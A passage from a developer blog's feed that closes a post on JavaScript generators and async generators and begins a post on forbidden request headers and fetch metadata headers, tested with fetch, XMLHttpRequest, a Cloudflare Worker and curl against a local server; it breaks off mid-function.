  console.log(leapYear);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notice that we don&apos;t need to wait for the &lt;em&gt;entire sequence&lt;/em&gt; of years to be built ahead of time. All state is stored within the iterable object itself, and the next item is computed &lt;em&gt;on demand&lt;/em&gt;. That&apos;s worth camping out on some more.&lt;/p&gt;&lt;h3&gt;Lazy Evaluation&lt;/h3&gt;&lt;p&gt;Lazy evaluation is one of the most-touted benefits of iterables. We don&apos;t &lt;em&gt;need&lt;/em&gt; every item in the sequence right from the get-go. In certain circumstances, this can be a great way to prevent performance issues.&lt;/p&gt;&lt;p&gt;Look at our &lt;code&gt;leapYears&lt;/code&gt; iterable again. If you wanted to stick with a &lt;code&gt;for&lt;/code&gt; loop to handle these values but &lt;em&gt;not&lt;/em&gt; use an iterable, you might&apos;ve reached for a pre-built array:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const leapYears = [];
const startYear = 1900;
const currentYear = new Date().getFullYear();

for (let year = startYear + 1; year &amp;lt;= currentYear; year++) {
  if (isLeapYear(year)) {
      leapYears.push(year);
    }
}

for (const leapYear of leapYears) {
  console.log(leapYear);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The code is certainly clear and readable (many would say more so than the previous version), but there are trade-offs:  we&apos;re executing &lt;em&gt;two&lt;/em&gt; &lt;code&gt;for&lt;/code&gt; loops instead of one, and more importantly, processing&lt;em&gt; the entire list of values up-front&lt;/em&gt;. It&apos;s a negligible impact for a scenario like this, but could be more taxing for a costly calculation, or for a much larger dataset. Think of something like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;for (const thing of getExpensiveThings(1000)) {
  // Do something important with thing.
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Without a custom iterable behind &lt;code&gt;getExpensiveThings()&lt;/code&gt;, the entire list of 1,000 items must be built &lt;em&gt;before anything&lt;/em&gt; can be done within the loop. The amount of time between executing the script and doing something of value is needlessly large.&lt;/p&gt;&lt;p&gt;In the same vein, it&apos;s nice for when you might not &lt;em&gt;need&lt;/em&gt; every item in the sequence. Maybe you want to find the first leap year a person experiences by birth year. Once it&apos;s identified, there&apos;s no reason to continue. If a pre-built array was used, part of it would end up being populated for nothing.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function getFirstLeapYear(birthYear) {
  for (const leapYear of leapYears) {
    if (leapYear &amp;gt;= birthYear) return leapYear;
  }
  
  return null;
}

// Only evaluates leap years up to 1992:
getFirstLeapYear(1989) // 1992&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Obviously, the efficiency gains would be more interesting with highly resource-intensive work, but you get the idea. If items aren&apos;t needed, no compute is wasted preparing them.&lt;/p&gt;&lt;p&gt;You&apos;re in good company if you&apos;re irked by how complex it feels to build one of these, by the way, so let&apos;s finally jump to generators – a feature built to make all this a little more ergonomic.&lt;/p&gt;&lt;h2&gt;Smoothing Over the Protocols w/ Generators&lt;/h2&gt;&lt;p&gt;Here&apos;s the same iterable from above, but written as a &lt;em&gt;generator function, &lt;/em&gt;which returns a &lt;em&gt;generator 0bject&lt;/em&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* generateGospels() {
  yield &quot;Matthew&quot;;
  yield &quot;Mark&quot;;
  yield &quot;Luke&quot;;
  yield &quot;John&quot;;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are two important constructs here: the &lt;code&gt;function*&lt;/code&gt; and &lt;code&gt;yield&lt;/code&gt; keywords. The former marks it as a generator function, and you can think of the &lt;code&gt;yield&lt;/code&gt; keyword as hitting &quot;pause&quot; whenever the generator is asked for the next value. &lt;/p&gt;&lt;p&gt;Under the hood, the same &lt;code&gt;next()&lt;/code&gt; method is called here too. Every time it&apos;s invoked, it&apos;ll move onto the next &lt;code&gt;yield&lt;/code&gt; statement (unless there aren&apos;t any more).&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const generator = generateGospels();

console.log(generator.next()); // {value: &apos;Matthew&apos;, done: false}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And of course, our &lt;code&gt;for...of&lt;/code&gt; loop behaves as expected as well: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;for (const gospel of generateGospels()) {
  console.log(gospel);
}

// Matthew
// Mark
// Luke
// John&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Remember: iterables (and generators) can be &lt;em&gt;infinite&lt;/em&gt;, which means you might see something like this in the wild: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* multipleGenerator(base) {
  let current = base;

  while (true) {
    yield current;

    current += base;
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Loops like that look scary, but they don’t have to lock up your browser. As long as a &lt;code&gt;yield&lt;/code&gt; is stuck between each iteration, everything will be paused when the next value is requested, and execution can go on its merry way.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const multiplier = multipleGenerator(22);

multiplier.next(); // {value: 22, done: false}
multiplier.next(); // {value: 44, done: false}
multiplier.next(); // {value: 66, done: false}

//... no infinite loop!&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That said, something worth calling out: generators execute &lt;em&gt;synchronously&lt;/em&gt;, so there&apos;s still plenty of opportunity to hold up the main thread. Fortunately, there are &lt;a href=&quot;https://macarthur.me/posts/long-tasks/?ref=cms.macarthur.me&quot;&gt;ways to prevent it&lt;/a&gt;. There&apos;s also &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGenerator?ref=cms.macarthur.me&quot;&gt;an &lt;code&gt;AsyncGenerator&lt;/code&gt; object&lt;/a&gt; that may help navigate challenges like this. &lt;/p&gt;&lt;h2&gt;Where I&apos;ve Begun to Appreciate Them&lt;/h2&gt;&lt;p&gt;There&apos;s no groundbreaking capability here. I&apos;m hard-pressed to find a problem that can&apos;t be solved with more common approaches. But as I&apos;ve started working with them more, I&apos;m coming to appreciate generators more often. A few reasons that come to mind:&lt;/p&gt;&lt;h3&gt;They can help reduce tight coupling.&lt;/h3&gt;&lt;p&gt;Generators (and all other iterators) shine at encapsulating themselves, including the management of its own state. More &amp;amp; more, I&apos;m noticing how this helps ease the coupling between components I had always blindly made interdependent.&lt;/p&gt;&lt;p&gt;Scenario: when a button is clicked, you want to sequentially show the moving average of some price over the past five years, starting long ago. You only need the average of one window at a time, and you might not even need every possible item in the set (the user might not click through all the way). This would do the job:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;let windowStart = 0;

function calculateMovingAverage(values, windowSize) {
  const section = values.slice(windowStart, windowStart + windowSize);

  if (section.length &amp;lt; windowSize) return null;

  return section.reduce((sum, val) =&amp;gt; sum + val, 0) / windowSize;
}

loadButton.addEventListener(&quot;click&quot;, function () {
  const avg = calculateMovingAverage(prices, 5);
  average.innerHTML = `Average: $${avg}`;
  windowStart++;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Every time the button is clicked, the next average is rendered to the screen. But it&apos;s lame that we need to have a persistent &lt;code&gt;windowStart&lt;/code&gt; variable at such a high scope, and I don&apos;t feel great about making the event listener responsible for updating that state. I want it exclusively focused on updating the UI. &lt;/p&gt;&lt;p&gt;On top of that, I might want to derive moving averages somewhere else on the page too. That&apos;d be hard with so many things intersecting with everything else. Boundaries are weak and portability is a no-go.  &lt;/p&gt;&lt;p&gt;A generator would help remedy this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* calculateMovingAverage(values, windowSize) {
  let windowStart = 0;

  while (windowStart &amp;lt;= values.length - 1) {
    const section = values.slice(windowStart, windowStart + windowSize);
    
    yield section.reduce((sum, val) =&amp;gt; sum + val, 0) / windowSize;
    
    windowStart++;
  }
}

const generator = calculateMovingAverage(prices, 5);

loadButton.addEventListener(&quot;click&quot;, function () {
  const { value } = generator.next();
  average.innerHTML = `Average: $${value}`;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are some nice perks: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;The &lt;code&gt;windowStart&lt;/code&gt; variable is only exposed where it&apos;s needed. No further. &lt;/li&gt;&lt;li&gt;Since state and logic are self-contained, you could have multiple, distinct generators being used in parallel with no issue. &lt;/li&gt;&lt;li&gt;Everything’s more focused in purpose. The math + state are left to the generator, and the click handler updates the DOM. Clear boundaries. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;I like that model. And we can push it even further. Up until now, the click handler has been the one &lt;em&gt;asking for&lt;/em&gt; the next value, directly depending on our generator to provide it. But we can flip that on it&apos;s head, allowing the generator to purely provide the ready-to-go values, leaving the click handler to do &lt;em&gt;just&lt;/em&gt; something with it. Neither piece needs to know about the intricacies of the other.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;for (const value of calculateMovingAverage(prices, 5)) {
  await new Promise((r) =&amp;gt; {
    loadButton.addEventListener(
      &quot;click&quot;,
      function () {
        average.innerHTML = `Average: $${value}`;
        r();
      },
      { once: true }
    );
  });
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I can feel the heads turning &amp;amp; noses scrunching. It&apos;s not exactly a pattern I&apos;d consider natural, but I respect the fact that it&apos;s possible. If the principle of &quot;inversion of control&quot; comes to mind reading through it, it did for me too. There&apos;s virtually no interdependence; no need for one component to know about the implementation details of the other. Once the work is done, the listener&apos;s cleaned up and control is given back to the generator. My gut says Uncle Bob might at least appreciate the sentiment (if not, &lt;em&gt;please&lt;/em&gt; make me the subject of a bathrobe rant 🤞).&lt;/p&gt;&lt;h3&gt;They can help avoid little &quot;annoying&quot; things.&lt;/h3&gt;&lt;p&gt;I&apos;ve been surprised by the number of pesky practices I&apos;ve often had to use to accomplish things in the past. Think: recursion, callbacks, etc. There&apos;s nothing wrong with them, but they don&apos;t &lt;a href=&quot;https://konmari.com/marie-kondo-rules-of-tidying-sparks-joy/?ref=cms.macarthur.me&quot;&gt;spark joy&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;One area in which that&apos;s been felt is recurring loops. Think of a dashboard displaying the latest application vitals every second. Features like this can be divided up into two concerns: requesting the data, and rendering it to the UI. There are plenty of options for getting it done:&lt;/p&gt;&lt;h4&gt;&lt;code&gt;setInterval()&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;You could opt for the classic &lt;code&gt;setInterval()&lt;/code&gt; – an appropriate choice since its whole purpose is to do things over and over and over (and over).&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// ...and over!

function monitorVitals(cb) {
  setInterval(async () =&amp;gt; {
    const vitals = await requestVitals();

    cb(vitals);
  }, 1000);
}

monitorVitals((vitals) =&amp;gt; {
  console.log(&quot;Update the UI...&quot;, vitals);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But a couple of things might irk you. To keep those two concerns separate, it requires a callback be passed around, potentially triggering deep wounds of &quot;callback hell&quot; from JavaScript&apos;s pre-Promise days. On top of that, the interval doesn&apos;t care about how long it takes to request the data. The request &lt;em&gt;could&lt;/em&gt; end up lasting longer than your interval, causing weird out-of-order issues. &lt;/p&gt;&lt;h4&gt;&lt;code&gt;setTimeout()&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;As an alternative, maybe you&apos;d go with recursion and a Promise-wrapped &lt;code&gt;setTimeout()&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function monitorVitals(cb) {
  const vitals = await requestVitals();

  cb(vitals);

  await new Promise((r) =&amp;gt; {
    setTimeout(() =&amp;gt; monitorVitals(cb), 1000);
  });
}

monitorVitals((vitals) =&amp;gt; {
  console.log(&quot;Update the UI...&quot;, vitals);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s fine too. But recursion may have killed your great-grandfather in the war and you don’t want to relive that trauma. You’re also still required to pass that callback around. &lt;/p&gt;&lt;h4&gt;&lt;code&gt;while(){}&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;There&apos;s also an infinite &lt;code&gt;while&lt;/code&gt; loop, broken up by some asynchronous code. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function monitorVitals(cb) {
  while (true) {
    await new Promise((r) =&amp;gt; setTimeout(r, 1000));

    const vitals = await requestVitals();
    cb(vitals);
  }
}

monitorVitals((vitals) =&amp;gt; {
  console.log(&quot;Update the UI...&quot;, vitals);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No more recursion, but that callback remains. Again, there&apos;s nothing in any of these examples inherently problematic. These are just tiny thorns in one&apos;s side. Fortunately, there&apos;s another option.&lt;/p&gt;&lt;h4&gt;Enter: The Asynchronous Generator&lt;/h4&gt;&lt;p&gt;I hinted at this earlier. A regular generator can become an &lt;em&gt;async&lt;/em&gt; generator&lt;em&gt; &lt;/em&gt;by placing &lt;code&gt;async&lt;/code&gt; in its definition. That is stupidly obvious to write, but it&apos;s special in another way. Async generators can use a &lt;code&gt;for await&lt;/code&gt; loop to run through the sequence of resolved values. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function* generateVitals() {
  while (true) {
    const result = await requestVitals();

    await new Promise((r) =&amp;gt; setTimeout(r, 1000));

    yield result
  }
}

for await (const vitals of generateVitals()) {
  console.log(&quot;Update the UI...&quot;, vitals);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The resulting behavior is the same, but without the emotional triggers. There are no timing risks, no recursion, and no callbacks. Distinct concerns can neatly keep to themselves. All you need to do is handle the sequence. &lt;/p&gt;&lt;h3&gt;They can help make exhaustive pagination more efficient.&lt;/h3&gt;&lt;p&gt;You&apos;ve probably done something like this if you&apos;ve ever needed every item of a paginated resource. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function fetchAllItems() {
  let currentPage = 1;
  let hasMore = true;
  let items = [];

  while (hasMore) {
    const data = await requestFromApi(currentPage);

    hasMore = data.hasMore;
    currentPage++;
    
    items = items.concat(data.items);
  }

  return items;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Few can walk away from that feeling at complete peace with so many auxiliary variables and list stitching going on. Not to mention, you need to wait for that API to be completely exhausted &lt;em&gt;before &lt;/em&gt;anything more interesting can occur. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const allItems = await fetchAllItems();

// Won&apos;t run until *all* items are fetched.
for (const item of items) {
  // Do stuff.
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not the most responsible solution in terms of timing or memory efficiency. We could get around it by refactoring to process items as each page is requested, but we then might suffer from the same issues we&apos;ve explored so far.&lt;/p&gt;&lt;p&gt;Try out this option instead:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function* fetchAllItems() {
  let currentPage = 1;

  while (true) {
    const data = await requestFromApi(currentPage);

    if (!data.hasMore) return;

    currentPage++;

    yield data.items;
  }
}

for await (const items of fetchAllItems()) {
  // Do stuff.
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Fewer auxiliary variables, much less time before any processing can begin, and concerns are still neatly tucked away from each other. Not bad.&lt;/p&gt;&lt;h3&gt;They make it really nice to generate sets of items on-the-fly. &lt;/h3&gt;&lt;p&gt;I mentioned this in the beginning, but it&apos;s so good, I&apos;m gonna sing its praises again.  Since generators are iterable, they can be destructured like you would any array. If you need a utility to generate various batches of things, generators make it real simple:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* getElements(tagName = &apos;div&apos;) {
  while (true) yield document.createElement(tagName);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, just destructure away, as many times as you like: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const [el1, el2, el3] = getElements(&apos;div&apos;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Objectively beautiful. For some more detail on this trick, &lt;a href=&quot;https://macarthur.me/posts/destructuring-with-generators/?ref=cms.macarthur.me&quot;&gt;see the full post&lt;/a&gt;.&lt;/p&gt;&lt;h2&gt;I Guess We&apos;ll See&lt;/h2&gt;&lt;p&gt;It&apos;s hard to tell if my newfound appreciation for generators will stick around for the long haul (I&apos;m probably still in a bit of a honeymoon phase with them right now). &lt;/p&gt;&lt;p&gt;But even if the enthusiasm dies tomorrow, I&apos;m glad I&apos;ve got more reps under my belt. Knowing how to use the tool is good and valuable, but being forced to rethink how I tend to approach a problem is even better. A decent ROI.&lt;/p&gt;</content:encoded></item><item><title>I guess some request headers are more trustworthy than others.</title><link>https://macarthur.me/posts/forbidden-request-headers</link><guid isPermaLink="true">https://macarthur.me/posts/forbidden-request-headers</guid><pubDate>Mon, 31 Mar 2025 16:29:10 GMT</pubDate><content:encoded>&lt;p&gt;I got to dabble in some content negotiation recently. I wanted to build an &quot;inspection&quot; page for any image URL served by &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;, which would show how effectively the image was optimized. When requested by way of an &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag, I&apos;d serve the image, like normal. But when that same URL was directly accessed in the browser&apos;s address bar, I’d render some pretty HTML. &lt;a href=&quot;https://picperf.io/i/https://macarthur.me/hedgehog.jpg?ref=cms.macarthur.me&quot;&gt;Here&apos;s an example&lt;/a&gt; of what I landed on. (I&apos;ve since changed the URL scheme, but the gist remains).&lt;/p&gt;&lt;p&gt;My first idea to tackle this was to read the request&apos;s &lt;code&gt;Accept&lt;/code&gt; header, which &lt;em&gt;should&lt;/em&gt; only contain the content types a client prefers. For browsers requesting an HTML document, it looks like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But for a request from an &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag, the browser instead uses something like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s relatively common for frameworks to leverage this header for negotiating content. Rails has an elegant way of doing it. You might&apos;ve used it before. The value of the &lt;code&gt;Accept&lt;/code&gt; header dictates how the application responds:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;class NoodleController &amp;lt; ApplicationController
  def show
    @noodle = Noodle.find(params[:id])

    respond_to do |format|
      format.html show.html.erb
      format.json { render json: @noodle }
    end
  end
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This seemed simple enough for me. If the header included &lt;code&gt;text/html&lt;/code&gt;, it was probably from a browser navigation. If not, it&apos;s an &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; or CSS requesting the image. &lt;/p&gt;&lt;p&gt;The risk, of course, is that there&apos;s always a more-than-zero chance of the &lt;code&gt;Accept&lt;/code&gt; header being unexpectedly manipulated (or even wiped) before the server receives it. For example, CDNs have been known to adjust header values, &lt;a href=&quot;https://learn.microsoft.com/en-us/answers/questions/594279/azure-cdn-does-not-forward-accept-header-to-origin?ref=cms.macarthur.me&quot;&gt;or remove them altogether&lt;/a&gt;. And if the request isn&apos;t fully owned by the browser itself (such as any &lt;code&gt;fetch()&lt;/code&gt; call from your application code), the unpredictability goes up even further. There are no rules preventing me from sending &lt;code&gt;Accept: Jesus&lt;/code&gt;, which could cause trouble if the server is expecting a very specific set of values. &lt;/p&gt;&lt;p&gt;I didn&apos;t want to deal with any of that. I wanted rock-solid confidence a request was coming &lt;strong&gt;straight from the browser&apos;s navigation bar&lt;/strong&gt;. &lt;/p&gt;&lt;p&gt;So, I was pretty happy to find that as long browsers stick to &lt;a href=&quot;https://fetch.spec.whatwg.org/?ref=cms.macarthur.me#forbidden-request-header&quot;&gt;the specification&lt;/a&gt;, we &lt;em&gt;can&lt;/em&gt; have that confidence. Some header values &lt;em&gt;can&lt;/em&gt; be trusted more than others. They&apos;re called &quot;forbidden request headers,&quot; and can be modified only by the user agent (the browser). &lt;em&gt;Nothing else&lt;/em&gt;. I was able to use a very specific set of forbidden headers to accomplish my objective (we&apos;ll get to those), but I wanted to dig a little further into them regardless.&lt;/p&gt;&lt;h2&gt;Verifying Some Headers Don&apos;t Budge&lt;/h2&gt;&lt;p&gt;There are actually 20-something different headers that spec-compliant user agents won&apos;t allow you to customize. It&apos;s unlikely you&apos;ve had to learn that the hard way – they&apos;re not the ones you&apos;re typically handling in a request (&lt;code&gt;Content-Type&lt;/code&gt;, &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;, etc.).&lt;/p&gt;&lt;p&gt;To get a feel for this, I set up basic Express server with a couple of routes: one for serving some HTML, and another for receiving a client-side, JavaScript-triggered HTTP request. All that endpoint does is spit out request&apos;s headers. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const app = express();

app.get(&quot;/page&quot;, (req, res) =&amp;gt; {
  res.sendFile(__dirname + &quot;/index.html&quot;);
});

// To be hit by client-side JavaScript:
app.get(&quot;/api&quot;, (req, res) =&amp;gt; {
  console.log(req.headers);
  
  res.send(&quot;got em&quot;);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, it was time to experiment a bit.&lt;/p&gt;&lt;h3&gt;via Fetch&lt;/h3&gt;&lt;p&gt;The first client-side request I sent came from &lt;code&gt;fetch()&lt;/code&gt;. In the request, I tried to set three different request headers. One of them – &lt;code&gt;Host&lt;/code&gt; – is forbidden: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&quot;module&quot;&amp;gt;
  const response = await fetch(&quot;http://localhost:3000/api&quot;, {
    headers: {
      &quot;X-Whatever&quot;: &quot;lulz&quot;,
      Accept: &quot;an-invalid-value&quot;,
      Host: &quot;http://fakehost.com&quot;
    },
  });
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&apos;s what the server received:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&apos;x-whatever&apos;: &apos;lulz&apos;,
accept: &apos;an-invalid-value&apos;
host: &apos;localhost:3000&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The first two were were set as expected, but the &lt;code&gt;Host&lt;/code&gt; override was &lt;strong&gt;completely ignored&lt;/strong&gt;. I got the same result from Node’s implementation of &lt;code&gt;fetch()&lt;/code&gt;, by the way. It also ignored by attempt: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;app.get(&quot;/&quot;, async (req, res) =&amp;gt; {
  // Server-side `fetch()` request:
  await fetch(&quot;http://localhost:3000/api&quot;, {
    headers: {
      &quot;X-Whatever&quot;: &quot;foolz&quot;,
      Accept: &quot;an-invalid-value&quot;,
      Host: &quot;http://fakehost.com&quot;,
    },
  });

  return res.send(&quot;ok&quot;);
});

app.get(&quot;/api&quot;, (req, res) =&amp;gt; {
  console.log(req.headers);

// Custom `host` value ignored:
//  {
//    &apos;x-whatever&apos;: &apos;foolz&apos;,
//    accept: &apos;an-invalid-value&apos;,
//    host: &apos;localhost:3000&apos;
//  }
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Despite being two very different worlds, the browser-server consistency isn&apos;t surprising. Node&apos;s fetch API was designed to follow the same specification as the browser implementation. That&apos;s made clear in &lt;a href=&quot;https://nodejs.org/api/globals.html?ref=cms.macarthur.me#fetch&quot;&gt;Node&apos;s documentation&lt;/a&gt;.&lt;/p&gt;&lt;h3&gt;via XMLHttpRequest&lt;/h3&gt;&lt;p&gt;I gave &lt;code&gt;XMLHttpRequest&lt;/code&gt; a shot too: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
  const xhr = new XMLHttpRequest();
  xhr.open(&quot;GET&quot;, &quot;http://localhost:3000/api&quot;);

  xhr.setRequestHeader(&quot;X-Whatever&quot;, &quot;foolz&quot;);
  xhr.setRequestHeader(&quot;Accept&quot;, &quot;an-invalid-value&quot;);
  xhr.setRequestHeader(&quot;Host&quot;, &quot;http://fakehost.com&quot;);

  xhr.send();
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interestingly, it was even &lt;em&gt;more&lt;/em&gt; aggressive, spitting out an error and leaving the request stuck in a &quot;pending&quot; status.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/03/CleanShot-2025-03-29-at-17.55.54@2x.png&quot; alt=&quot;error from XMLHttpRequest&quot; loading=&quot;lazy&quot; width=&quot;1596&quot; height=&quot;444&quot; /&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/03/CleanShot-2025-03-29-at-17.57.04@2x.png&quot; alt=&quot;XMLHttpRequest stuck in &amp;quot;pending&amp;quot; status&quot; loading=&quot;lazy&quot; width=&quot;1134&quot; height=&quot;286&quot; /&gt;&lt;/figure&gt;&lt;p&gt;So, if you&apos;re looking to override any of those headers in the browser, you&apos;re outta luck. &lt;/p&gt;&lt;h3&gt;via Cloudflare Worker&lt;/h3&gt;&lt;p&gt;Because edge functions, CDNs, and other reverse proxies are so often in the middle of requests, I wanted to verify &lt;code&gt;fetch()&lt;/code&gt;&apos;s behavior from within a Cloudflare worker too. I kept it simple. As a request comes in, attempt to override the host: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;export default {
  fetch(request) {
    const newRequest = new Request(
      &quot;https://my-temporary-url.ngrok-free.app&quot;,
      { 
        ...request, 
        headers: {
          ...request.headers,
          &quot;x-whatever&quot;: &quot;foolz&quot;,
          accept: &quot;an-invalid-value&quot;,
          host: &quot;fakehost.com&quot;,
        },
      }
    );

    return fetch(newRequest);
  },
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Same deal. &lt;code&gt;x-whatever&lt;/code&gt; and &lt;code&gt;accept&lt;/code&gt; were respected, but &lt;code&gt;host&lt;/code&gt; was ignored.&lt;/p&gt;&lt;h2&gt;Not Everything Respects the Spec&lt;/h2&gt;&lt;p&gt;Of course, there are plenty of other tools that weren&apos;t built according to these rules. Postman is one of them. This will work just fine: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/03/CleanShot-2025-03-29-at-18.01.57@2x.png&quot; alt=&quot;request sent via Postman&quot; loading=&quot;lazy&quot; width=&quot;1248&quot; height=&quot;712&quot; /&gt;&lt;/figure&gt;&lt;p&gt;It works with &lt;code&gt;curl&lt;/code&gt; too. In fact, executing a &lt;code&gt;curl&lt;/code&gt; command in your code is one way to get around them in Node (&lt;a href=&quot;https://x.com/mehulmpt/status/1888954314896388550?ref=cms.macarthur.me&quot;&gt;Mehul Mohan&lt;/a&gt;&apos;s one of many who&apos;ve likely done this): &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const { spawn } = require(&quot;child_process&quot;);

spawn(&quot;curl&quot;, [
  &quot;-X&quot;,
  &quot;GET&quot;,
  &quot;http://localhost:3000/api&quot;,
  &quot;-H&quot;,
  &quot;Host: http://fakehost.com&quot;,
]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is a good reminder that a specification&apos;s existence doesn&apos;t force a tool to respect it. Nothing on the internet can be &lt;em&gt;completely, universally&lt;/em&gt; trusted.&lt;/p&gt;&lt;h2&gt;Metadata Request Headers&lt;/h2&gt;&lt;p&gt;Still, the laissez-faire, libertarian engineers out there might not like the fact that these &quot;forbidden&quot; headers exist. But I&apos;ve come to appreciate them in certain cases. Consider the aforementioned content negotiation I was doing with PicPerf. I wanted real good confidence that a request was coming from a user navigating to my page in the browser. The &lt;code&gt;Accept&lt;/code&gt; header would probably have been fine, but there&apos;s a set of forbidden request headers that are far more reliable: &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Glossary/Fetch_metadata_request_header?ref=cms.macarthur.me&quot;&gt;fetch metadata request headers&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;These headers are intended to give a whole bunch of extra context about a request, which is often useful for a server to determine how to respond. And being &quot;forbidden,&quot; you can have reasonably high confidence they weren&apos;t modified by anything other than the user agent. &lt;/p&gt;&lt;p&gt;To figure out if a request came from a user navigating to a page in the browser, these headers provide a number of options: &lt;/p&gt;&lt;h3&gt;&apos;sec-fetch-mode&apos;: &apos;navigate&apos;&lt;/h3&gt;&lt;p&gt;This value indicates the purpose of the request is to navigate between different HTML documents. It won&apos;t be set to this for any other request in the browser. &lt;/p&gt;&lt;h3&gt;&apos;sec-fetch-dest&apos;: &apos;document&apos;&lt;/h3&gt;&lt;p&gt;The request&apos;s destination is an HTML document, specifically triggered by top-level, user-initiated navigation. Even if a &lt;code&gt;fetch()&lt;/code&gt; request were to try to ask for a document, by including &lt;code&gt;text/html&lt;/code&gt; in the &lt;code&gt;accept&lt;/code&gt; header, this &lt;code&gt;sec-&lt;/code&gt; header would &lt;em&gt;not&lt;/em&gt; be set to &apos;document&apos;. &lt;/p&gt;&lt;h3&gt;&apos;sec-fetch-user&apos;: &apos;?1&apos;,&lt;/h3&gt;&lt;p&gt;This header will only exist if the request was triggered by direct user action (navigating between pages). It wouldn&apos;t even exist if the user clicked a button triggering a &lt;code&gt;fetch()&lt;/code&gt; request. It&apos;s too far removed. &lt;/p&gt;&lt;h3&gt;&apos;sec-fetch-site&apos;: &apos;none&apos;,&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;sec-fetch-site&lt;/code&gt; header is intended to give the server context about the origin of the requested resource (the same site, a different one, etc.). But it&apos;ll always be set to &quot;none&quot; if it&apos;s triggered by a user directly navigating to a page.&lt;/p&gt;&lt;p&gt;This makes it simple enough to determine whether any given request is from a user in the browser. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function isUserNavigation(headers) {
  return (
    headers[&quot;sec-fetch-dest&quot;] === &quot;document&quot; &amp;amp;&amp;amp;
    headers[&quot;sec-fetch-mode&quot;] === &quot;navigate&quot; &amp;amp;&amp;amp;
    headers[&quot;sec-fetch-site&quot;] === &quot;none&quot; &amp;amp;&amp;amp;
